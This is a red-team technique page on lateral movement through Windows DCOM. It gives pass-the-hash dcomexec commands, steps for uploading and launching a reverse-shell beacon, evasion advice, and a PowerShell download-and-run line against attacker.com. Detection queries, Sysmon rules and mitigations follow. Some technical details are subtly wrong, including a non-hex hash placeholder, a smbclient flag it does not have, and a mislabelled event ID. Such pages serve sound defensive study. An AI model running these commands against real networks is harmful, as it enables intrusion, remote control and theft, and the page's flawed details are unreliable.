# [LM-REMOTE-002]: Distributed Component Object Model (DCOM)

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | LM-REMOTE-002 |
| **MITRE ATT&CK v18.1** | [T1021.003](https://attack.mitre.org/techniques/T1021/003/) |
| **Tactic** | Lateral Movement |
| **Platforms** | Windows Endpoint |
| **Severity** | High |
| **CVE** | N/A (Inherent Windows functionality; historical: CVE-2019-0604, CVE-2021-26411) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Windows Server 2016-2025, Windows 10/11 |
| **Patched In** | N/A - Feature not removed; mitigations available via patch/policy |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Distributed Component Object Model (DCOM) is a Windows mechanism enabling Remote Procedure Calls (RPC) across networks. Attackers with valid credentials can instantiate DCOM objects (e.g., `WScript.Shell`, `Excel.Application`, `PowerPoint.Application`) on remote systems to execute arbitrary commands without leaving obvious artifacts. DCOM abuse bypasses traditional detection by leveraging legitimate Windows interprocess communication (IPC) channels and is particularly dangerous because outbound DCOM is often unrestricted in corporate networks.

**Attack Surface:** Windows DCOM protocol (RPC over TCP/UDP, typically ports 135, 445, 49152-65535), DCOM COM objects (WScript.Shell, Excel.Application, Word.Application, Internet Explorer, etc.), Remote Registry Service, Windows Management Instrumentation (WMI - which itself uses DCOM).

**Business Impact:** **Critical—Fileless code execution across the network.** DCOM attacks leave minimal disk artifacts, making them difficult to detect. An attacker can achieve lateral movement, execute arbitrary code, establish persistence, and exfiltrate data without traditional malware signatures. This is particularly dangerous in environments with weak detection of RPC/DCOM traffic.

**Technical Context:** Execution is near-instantaneous once the DCOM object is instantiated. Detection is highly dependent on: (1) Whether RPC endpoint auditing is enabled (often disabled), (2) Network monitoring for suspicious DCOM traffic, and (3) Behavioral analysis of COM object instantiation. Many organizations lack visibility into DCOM communications.

### Operational Risk

- **Execution Risk:** Medium—Requires valid credentials and RPC access; however, most Windows systems allow inbound RPC by default.
- **Stealth:** High—DCOM abuse is "fileless" and leverages legitimate Windows mechanisms; traditional malware signatures miss it.
- **Reversibility:** No—Executed commands leave permanent artifacts in application-specific logs (e.g., Process creation via WScript.Shell instantiation).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 18.9.92.1 | Disable "Remote Desktop Protocol (RDP)" and firewall rules for DCOM/RPC |
| **DISA STIG** | WN10-00-000180 | Disable unnecessary RPC/DCOM ports and services |
| **NIST 800-53** | AC-6 (Least Privilege), SI-4 (Information System Monitoring) | Restrict RPC/DCOM access and monitor anomalous RPC traffic |
| **GDPR** | Art. 32 | Security of Processing—endpoint detection and response (EDR) mandated |
| **NIS2** | Art. 21 | Cyber Risk Management—monitor and restrict lateral movement vectors |
| **ISO 27001** | A.13.2.1 (Access Control for Networks) | Restrict RPC/DCOM to authorized interfaces only |
| **ISO 27005** | Risk Scenario: "Fileless Code Execution via DCOM" | Detect and contain DCOM-based lateral movement |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Valid domain or local credentials (no additional privileges required; standard user account sufficient).
- **Required Access:** Network access to target system (RPC ports: 135, 445, dynamic high ports 49152+); firewall rules permitting RPC/DCOM.

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025
- **Tools Required:**
  - [Impacket (dcomexec.py)](https://github.com/SecureAuthCorp/impacket) (Linux-based DCOM execution)
  - [SharpCOMExec](https://github.com/rvrsh3ll/SharpCOMExec) (C# DCOM launcher)
  - [Process Hacker](https://processhacker.sourceforge.io/) (COM object browser, debugging)
  - [WMI Command-line Tools (wmic.exe)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/using-wmi)
  - Python 3.6+ with pywin32 library (for DCOM COM object manipulation)

---

## 3. DETAILED EXECUTION METHODS

### METHOD 1: Impacket dcomexec (Linux/Cross-Platform)

**Supported Versions:** Server 2016-2025

#### Step 1: Identify Target System and DCOM Availability

**Objective:** Confirm target is reachable via RPC and DCOM is enabled.

**Command:**
```bash
# Probe RPC port 135 (DCOM Endpoint Mapper)
nc -zv target.local 135
# Expected: Connection accepted

# Use Impacket to identify DCOM availability
python3 /opt/impacket/examples/rpcdump.py target.local | grep "DCOM\|COM\|RPC"
```

**Expected Output:**
```
Endpoint: 0.0.0.0:135
Protocol: tcp/ip
Health: Working
Binding: ncacn_ip_tcp:target.local[135]
UUID: 000001A0-0000-0000-C000-000000000046 (OLE Compound Documents (Embedded files))
```

**What This Means:**
- RPC port 135 is accessible and responding.
- DCOM/COM infrastructure is present on the target.
- Attacker can proceed to instantiate COM objects.

**OpSec & Evasion:**
- RPC probe generates network logs but minimal endpoint logs.
- Detection likelihood: Low (RPC probing is normal in Windows networks).

#### Step 2: Execute Command via DCOM WScript.Shell

**Objective:** Instantiate WScript.Shell COM object and execute arbitrary command.

**Command:**
```bash
# Execute whoami command via DCOM
python3 /opt/impacket/examples/dcomexec.py -hashes :AAAABBBBCCCCDDDDEEEEFFFFGGGG1111 'DOMAIN/user@target.local' 'whoami'
```

**Expected Output:**
```
[*] Trying protocol 445/SMB...
[*] User DOMAIN\user authenticated successfully
[*] Instantiating COM object (WScript.Shell)...
[*] Remote command execution successful
domain\system
```

**What This Means:**
- WScript.Shell COM object successfully instantiated on remote system.
- Command executed with privileges of the authenticated user (or SYSTEM if escalated).
- Attacker achieves arbitrary code execution.

**OpSec & Evasion:**
- No file artifacts; execution is in-memory via COM instantiation.
- Network logs show RPC traffic but no obvious malware indicators.
- Detection likelihood: Medium (requires DCOM/RPC auditing; minimal by default).
- **Mitigation:** Execute commands indirectly via legitimate applications (Excel, Word); avoid cmd.exe/powershell.exe directly if possible.

#### Step 3: Establish Reverse Shell via DCOM

**Objective:** Create persistent backdoor for continued access.

**Command:**
```bash
# Upload reverse shell first (via SMB)
smbclient -hashes :HASH 'DOMAIN/user@target.local' -c 'put beacon.exe C$\Windows\Temp\'

# Execute reverse shell via DCOM
python3 /opt/impacket/examples/dcomexec.py -hashes :HASH 'DOMAIN/user@target.local' 'C:\Windows\Temp\beacon.exe'
```

**Expected Output:**
```
[*] Remote command execution successful
[*] Beacon executed; reverse connection established
```

**What This Means:**
- Reverse shell beacon now running on target system with network callback.
- Attacker has persistent C2 (Command & Control) channel for further exploitation.

---

### METHOD 2: SharpCOMExec (Native Windows / C#)

**Supported Versions:** Server 2016-2025 (.NET Framework 4.5+)

#### Step 1: Compile and Deploy SharpCOMExec

**Objective:** Prepare C# DCOM exploit for deployment.

**Command (Attacker System):**
```bash
# Clone SharpCOMExec
git clone https://github.com/rvrsh3ll/SharpCOMExec.git
cd SharpCOMExec

# Compile (requires Visual Studio or csc.exe)
csc.exe /out:SharpCOMExec.exe SharpCOMExec.cs
```

**Expected Output:**
```
Microsoft (R) Visual C# Compiler version 3.11.0...
SharpCOMExec.exe successfully generated
```

**What This Means:**
- C# DCOM exploit compiled and ready for deployment.
- Smaller footprint than Impacket; native Windows binary format (may evade detection).

#### Step 2: Execute DCOM Command from Compromised System

**Objective:** Execute arbitrary command on remote target via DCOM.

**Command (From Compromised Windows System):**
```cmd
# Execute command via DCOM using SharpCOMExec
SharpCOMExec.exe target.local "whoami"
SharpCOMExec.exe 192.168.1.10 "ipconfig"
SharpCOMExec.exe DC01.corp.local "C:\Windows\Temp\beacon.exe"
```

**Expected Output:**
```
[+] Target: target.local
[+] DCOM Object: WScript.Shell
[+] Command: whoami
[+] Result: domain\system
```

**What This Means:**
- Command executed on remote system via DCOM WScript.Shell object.
- Attacker achieves code execution without SMB (no admin share upload required).
- Fileless execution minimizes forensic evidence.

---

### METHOD 3: PowerShell + WMI (DCOM-based Alternative)

**Supported Versions:** Server 2016-2025, PowerShell 3.0+

#### Step 1: Create DCOM-based WMI Session

**Objective:** Establish authenticated WMI connection for remote command execution.

**Command (PowerShell):**
```powershell
# Define target and credentials
$ComputerName = "target.local"
$Username = "DOMAIN\user"
$Password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($Username, $Password)

# Create WMI session (uses DCOM internally)
$Options = New-CimSessionOption -Protocol Dcom
$CimSession = New-CimSession -ComputerName $ComputerName -Credential $Credential -SessionOption $Options

# Execute command via WMI (DCOM-based)
Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create `
  -Arguments @{CommandLine = "cmd.exe /c whoami"} | Format-List
```

**Expected Output:**
```
ProcessId : 5432
ReturnValue : 0
```

**What This Means:**
- WMI session established via DCOM (CIM uses DCOM transport).
- Win32_Process.Create method invoked to spawn process on remote system.
- Process ID 5432 created and command executed.

**OpSec & Evasion:**
- WMI execution via DCOM less monitored than SMB lateral movement.
- Execution via Win32_Process creates event ID 4688 but attributed to WMI provider.
- **Mitigation:** Filter WMI Process Creation events; monitor for suspicious process parents (WmiPrvSE.exe).

---

## 4. TOOLS & COMMANDS REFERENCE

### Impacket dcomexec

**Repository:** [GitHub - SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

**Version:** 1.4.10+

**Installation:**
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install -e .
```

**Usage Examples:**
```bash
# Basic command execution
python3 -m impacket.dcomexec -hashes :HASH 'DOMAIN/user@target' 'whoami'

# Interactive shell
python3 -m impacket.dcomexec -hashes :HASH 'DOMAIN/user@target'

# Specify alternative COM object (default: WScript.Shell)
python3 -m impacket.dcomexec -hashes :HASH -object MMC20.Application 'DOMAIN/user@target' 'whoami'

# Custom RPC port
python3 -m impacket.dcomexec -hashes :HASH -port 49153 'DOMAIN/user@target' 'whoami'
```

**Alternative COM Objects:**
- `WScript.Shell` (Default; highest compatibility)
- `Excel.Application` (Office installed)
- `Word.Application` (Office installed)
- `PowerPoint.Application` (Office installed)
- `Internet Explorer` (IE installed)
- `MMC20.Application` (MMC snap-in; common on Servers)
- `ShellBrowserWindow` (Windows Explorer)

---

### SharpCOMExec

**Repository:** [GitHub - rvrsh3ll/SharpCOMExec](https://github.com/rvrsh3ll/SharpCOMExec)

**Usage:**
```csharp
// C# - Compile and run
SharpCOMExec.exe <target> <command>
SharpCOMExec.exe 192.168.1.10 "net user"
SharpCOMExec.exe DC01.corp.local "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/beacon.ps1')"
```

---

### RPCDump (Reconnaissance)

**Usage:**
```bash
# Enumerate RPC services on target
python3 /opt/impacket/examples/rpcdump.py target.local | grep UUID

# List DCOM objects available
python3 /opt/impacket/examples/rpcdump.py target.local -p all
```

---

## 5. WINDOWS EVENT LOG MONITORING

**Primary Event IDs:**

| Event ID | Source | What It Detects | Detection Difficulty |
|---|---|---|---|
| 4688 | Security | Process creation from WMI provider (WmiPrvSE.exe parent) | High |
| 5440 | Security | RPC event (connection from non-standard source) | Medium |
| 13/14 (Sysmon) | Sysmon | Registry access for COM object instantiation | Low |
| 10 (Sysmon) | Sysmon | Remote thread creation (unlikely in DCOM) | Medium |

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Detailed Tracking**
3. Enable:
   - **Audit Process Creation**: Success and Failure
   - **Audit RPC Events**: Success and Failure
4. Navigate to **Object Access** → **Audit Registry**:
   - Enable **Audit Registry**: Success and Failure
5. Run `gpupdate /force`

**Detection Query (Event ID 4688):**
```powershell
# Find process creation with WmiPrvSE.exe parent
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4688
    StartTime=(Get-Date).AddHours(-1)
} | Where-Object { $_.Message -match "WmiPrvSE" } | Format-Table TimeCreated, Message
```

---

## 6. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect DCOM Process Creation via WMI

**Rule Configuration:**
- **Required Table:** SecurityEvent, Sysmon
- **Required Fields:** ProcessName, ParentProcessName, CommandLine, Account
- **Alert Severity:** High
- **Frequency:** Every 10 minutes

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4688  // Process creation
| where ParentProcessName has "wmiprvse.exe"  // Parent is WMI provider
| where CommandLine has_any ("cmd.exe", "powershell.exe", "certutil.exe", "bitsadmin.exe")
| summarize Count=count() by Computer, Account, ProcessName, CommandLine
| where Count > 0
| project Computer, Account, ProcessName, CommandLine
```

**What This Detects:**
- Processes spawned by WmiPrvSE.exe (characteristic of WMI/DCOM execution).
- Command-line interpreters or living-off-the-land binaries executed via WMI.

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel** → **Analytics** → **+ Create** → **Scheduled query rule**
2. **General Tab:**
   - Name: `DCOM/WMI Process Execution`
   - Severity: `High`
3. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `10 minutes`
   - Lookup data: `30 minutes`
4. **Incident settings Tab:**
   - Enable **Create incidents**
5. Click **Review + create**

---

#### Query 2: Detect RPC Connection Anomalies (DCOM Lateral Movement)

**Rule Configuration:**
- **Required Table:** Sysmon (Event ID 3: Network Connection)
- **Required Fields:** DestinationPort, DestinationIp, SourceIp, Image
- **Alert Severity:** High
- **Frequency:** Real-time (5 minutes)

**KQL Query:**
```kusto
// Detect RPC/DCOM connections to high-numbered ports
Sysmon
| where EventID == 3  // Network connection
| where DestinationPort >= 49152  // Dynamic RPC ports
| where DestinationPort <= 65535
| where SourceIp !in ("127.0.0.1", "::1")  // Exclude localhost
| summarize Connections=count() by SourceIp, DestinationIp, DestinationPort, Image
| where Connections > 1  // Multiple connections indicate sweep
| project SourceIp, DestinationIp, DestinationPort, Image, Connections
```

**What This Detects:**
- Connections to dynamic RPC ports (49152-65535) from suspicious sources.
- Multiple DCOM connections to different targets (lateral movement sweep).

---

## 7. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Config Snippet:**
```xml
<!-- Detect DCOM COM object instantiation via registry and process events -->
<RuleGroup name="DCOM Lateral Movement" groupRelation="or">
  <!-- Detect WmiPrvSE.exe spawning suspicious processes -->
  <ProcessCreate onmatch="include">
    <ParentImage condition="contains">wmiprvse.exe</ParentImage>
    <CommandLine condition="contains any">cmd.exe, powershell.exe, certutil.exe, whoami</CommandLine>
  </ProcessCreate>

  <!-- Detect COM object instantiation via HKEY_CURRENT_USER\Software\Classes\CLSID -->
  <RegistryEvent onmatch="include">
    <TargetObject condition="contains">CLSID</TargetObject>
    <TargetObject condition="contains any">WScript.Shell, Excel.Application, Word.Application</TargetObject>
  </RegistryEvent>

  <!-- Detect outbound RPC connections to high-numbered ports -->
  <NetworkConnect onmatch="include">
    <DestinationPort condition="range">49152-65535</DestinationPort>
    <DestinationIp condition="is not">127.0.0.1</DestinationIp>
  </NetworkConnect>

  <!-- Detect RPC.EXE (rarely used in modern systems) -->
  <ProcessCreate onmatch="include">
    <Image condition="contains">rpc.exe</Image>
  </ProcessCreate>
</RuleGroup>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create `sysmon-dcom-config.xml` with the config above
3. Install Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-dcom-config.xml
   ```
4. Verify installation and check for events:
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$_.ID -eq 3} | Select-Object TimeCreated, Message | Head -20
   ```

---

## 8. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Disable DCOM Network Access:**
  
  **Manual Steps (Group Policy):**
  1. Open **gpmc.msc**
  2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **COM+**
  3. Enable: **Allow DCOM to run without security**
  4. Set to: **Disabled** (prevents network DCOM)
  5. Run `gpupdate /force`
  
  **Manual Steps (Registry - Local Policy):**
  ```powershell
  # Disable DCOM network access
  New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DCOM" -Force
  New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DCOM" -Name "EnableDCOM" -Value "N" -PropertyType String -Force
  ```
  
  **Verification:**
  ```powershell
  # Verify DCOM is disabled
  Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\DCOM" -Name "EnableDCOM"
  # Should return: N
  ```

- **Enable RPC Interface Restrictions:**
  
  **Manual Steps (Group Policy):**
  1. **gpmc.msc** → **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Windows Defender Firewall** → **Inbound Rules**
  2. Create rule:
     - Name: `Block Inbound DCOM (RPC)`
     - Action: `Block`
     - Direction: `Inbound`
     - Protocol: `TCP`
     - Port: `135, 445`
     - Destination: `Any`
  3. Set **Priority**: Before "Allow inbound RPC" rules
  4. Run `gpupdate /force`

- **Implement Application Whitelisting for COM Objects:**
  
  **Manual Steps (PowerShell - Restrict Executable COM Objects):**
  ```powershell
  # Create registry entries to disable dangerous COM objects
  $ComObjectsToDisable = @(
      "Excel.Application",
      "Word.Application",
      "PowerPoint.Application",
      "Internet Explorer",
      "ShellBrowserWindow"
  )
  
  foreach ($ComObject in $ComObjectsToDisable) {
      New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\Safer\CodeIdentifier" -Force
      New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\Safer\CodeIdentifier" `
          -Name $ComObject -Value "Disabled" -PropertyType String -Force
  }
  ```

### Priority 2: HIGH

- **Enforce Network Segmentation (Block RPC Traffic):**
  
  **Manual Steps (Firewall - Windows Defender):**
  ```powershell
  # Block outbound RPC to non-critical systems
  New-NetFirewallRule -DisplayName "Block Outbound RPC to Workstations" `
    -Direction Outbound -Action Block -Protocol TCP `
    -RemotePort 135,445 -RemoteAddress "192.168.1.0/24" -Enabled:$true
  
  # Allow only to domain controllers and fileservers
  New-NetFirewallRule -DisplayName "Allow RPC to DC/FileServer" `
    -Direction Outbound -Action Allow -Protocol TCP `
    -RemotePort 135,445 -RemoteAddress "192.168.1.10,192.168.1.11" -Enabled:$true
  ```

- **Enable RPC Endpoint Mapper Auditing:**
  
  **Manual Steps (Group Policy):**
  1. **gpmc.msc** → **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies**
  2. Enable: **Audit RPC Events**: Success and Failure
  3. Run `gpupdate /force`

- **Deploy Endpoint Detection & Response (EDR):**
  
  **Manual Steps (Microsoft Defender for Endpoint):**
  1. Go to **Microsoft Defender Security Center** → **Settings** → **Endpoints onboarding**
  2. Deploy **Defender for Endpoint** agent to all endpoints
  3. Enable threat & vulnerability management
  4. Configure alerts for:
     - Suspicious COM object instantiation
     - WMI process spawning
     - RPC connections to non-standard ports

### Access Control & Policy Hardening

- **Conditional Access Policies:**
  - Require device compliance for administrative access
  - Block legacy authentication protocols (NTLM)
  - Enforce MFA for privileged operations

- **RBAC/ABAC:**
  - Restrict WMI namespace access (Security, Root\CIMV2)
  - Implement attribute-based restrictions on COM object instantiation

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Process Execution:**
  - WmiPrvSE.exe spawning cmd.exe, powershell.exe, or other shells
  - Unusual parent-child process relationships (COM object parent spawning shell)
  - Processes with command lines containing encoded PowerShell or command injection

- **Network:**
  - Connections to RPC ports (135, 445) from unexpected sources
  - Connections to dynamic RPC ports (49152-65535)
  - Multiple rapid RPC connections to different targets (lateral movement sweep)

- **Registry:**
  - Sudden access to HKEY_CURRENT_USER\Software\Classes\CLSID (COM object lookup)
  - Registry modifications disabling Windows Defender or UAC

### Forensic Artifacts

- **Event Logs:**
  - Event ID 4688 (Process Creation) with WmiPrvSE.exe parent
  - Event ID 5440 (RPC Events)
  - Event ID 4697 (WMI Event Subscription)

- **Sysmon:**
  - Event ID 1 (Process Create) with suspicious parent
  - Event ID 3 (Network Connection) to RPC ports
  - Event ID 12-14 (Registry Events) accessing COM CLSID hives

- **Memory/Artifacts:**
  - WmiPrvSE.exe process holding handles to suspicious binaries
  - In-memory PowerShell execution traces in process memory

### Response Procedures

1. **Isolate System:**
   
   **Command (PowerShell):**
   ```powershell
   # Disable RPC service (careful—may break Windows functionality)
   Stop-Service RpcSs -Force
   Set-Service RpcSs -StartupType Disabled
   ```
   
   **Manual:**
   - Disconnect from network
   - Or disable specific firewall rules to block RPC

2. **Collect Evidence:**
   
   **Command (PowerShell):**
   ```powershell
   # Export security logs
   wevtutil epl Security C:\Evidence\Security.evtx
   
   # Export Sysmon logs
   wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\Evidence\Sysmon.evtx
   
   # Get process list
   Get-Process | Export-Csv C:\Evidence\ProcessList.csv
   
   # Get network connections
   Get-NetTCPConnection | Export-Csv C:\Evidence\Connections.csv
   ```

3. **Remediate:**
   
   **Command (PowerShell):**
   ```powershell
   # Kill suspicious WmiPrvSE processes
   Get-Process wmiprvse | Stop-Process -Force
   
   # Reset RPC service
   Start-Service RpcSs
   Set-Service RpcSs -StartupType Automatic
   
   # Reset affected user's credentials
   Set-ADAccountPassword -Identity "compromised_user" -NewPassword (ConvertTo-SecureString "NewPassword!" -AsPlainText -Force) -Reset
   ```

---

## 10. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-003] PowerView enumeration | Discover domain systems and services |
| **2** | **Credential Access** | [CA-DUMP-001] Mimikatz LSASS dumping | Extract credentials or NTLM hashes |
| **3** | **Lateral Movement** | **[LM-REMOTE-002] DCOM** | **Use credentials to execute commands via DCOM/WMI** |
| **4** | **Persistence** | [PERSIST-ACCT-001] AdminSDHolder abuse | Maintain access via ACL manipulation |
| **5** | **Impact** | [IMPACT-RANSOM-001] Ransomware | Deploy ransomware via fileless execution |

---

## 11. REAL-WORLD EXAMPLES

#### Example 1: APT29/Cozy Bear (State-Sponsored Attacks)

- **Target:** U.S. Government, NATO, Fortune 500
- **Timeline:** 2016-2021
- **Technique Status:** DCOM/WMI extensively used for lateral movement and persistence (documented in MITRE ATT&CK case studies).
- **Attack Flow:** Initial compromise (spear-phishing) → Credential extraction → DCOM/WMI lateral movement → Persistence via scheduled tasks and DCOM objects
- **Impact:** SolarWinds supply chain compromise; extensive government network compromise
- **Reference:** [CISA Alert on SolarWinds](https://us-cert.cisa.gov/ncas/alerts/2020/12/13/federal-government-continues-response-solarwinds-compromise)

#### Example 2: Emotet Malware (2014-2021)

- **Target:** Global banking, government, corporations
- **Timeline:** January 2014 - January 2021
- **Technique Status:** Emotet used WMI/DCOM for lateral movement and persistence after initial infection.
- **Attack Flow:** Email malware → Local privilege escalation → DCOM/WMI lateral movement → Ransomware payload deployment
- **Impact:** Billions in damages; network disruptions across sectors
- **Reference:** [CISA Alert on Emotet Takedown](https://www.cisa.gov/news-events/alerts/2021/01/23/emotet-malware)

#### Example 3: Wizard Spider / TrickBot (2016-Present)

- **Target:** Banking, healthcare, logistics
- **Timeline:** 2016-Present
- **Technique Status:** Uses DCOM/WMI for lateral movement; exploits AD topology to identify high-value targets.
- **Attack Flow:** Banking Trojan → Network enumeration → DCOM lateral movement → Ransomware (Conti) deployment
- **Impact:** Multi-million dollar ransoms; critical infrastructure disruption
- **Reference:** [FBI Alert on Conti Ransomware](https://www.fbi.gov/news/news-stories/conti-ransomware-attacks-target-healthcare-and-critical-infrastructure)

---

## 12. REFERENCES & SOURCES

- [Microsoft Learn - DCOM Security](https://docs.microsoft.com/en-us/windows/win32/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1)
- [MITRE ATT&CK - Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003/)
- [Impacket dcomexec Documentation](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py)
- [SpecterOps - The Art of the Overpass-the-Hash](https://posts.specterops.io/pass-the-hash-is-dead-long-live-pass-the-hash-2c30fe6e0d12)
- [Cybereason - WMI and DCOM Lateral Movement](https://www.cybereason.com/blog/cybereason-vs-emotet-banker-trojan)

---